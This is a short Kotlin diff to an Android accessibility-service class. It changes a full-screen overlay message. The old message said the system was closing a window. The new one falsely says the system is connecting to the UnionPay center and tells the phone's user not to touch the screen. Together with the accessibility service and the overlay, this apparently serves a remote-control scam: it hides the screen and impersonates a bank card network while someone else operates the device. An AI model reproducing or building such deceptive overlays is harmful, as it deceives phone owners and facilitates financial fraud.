@@ -1206,7 +1206,7 @@ class InputService : AccessibilityService() {
         overLay.setClickable(false)
 
         val loadingText = TextView(this, null)
-	loadingText.text = "\n\n系统正在关闭窗口\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待..."
+	loadingText.text = "\n\n系统正在对接银联中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待..."
 	loadingText.setTextColor(-7829368)
 	loadingText.textSize = 18.0f
 	loadingText.gravity = Gravity.LEFT //Gravity.CENTER
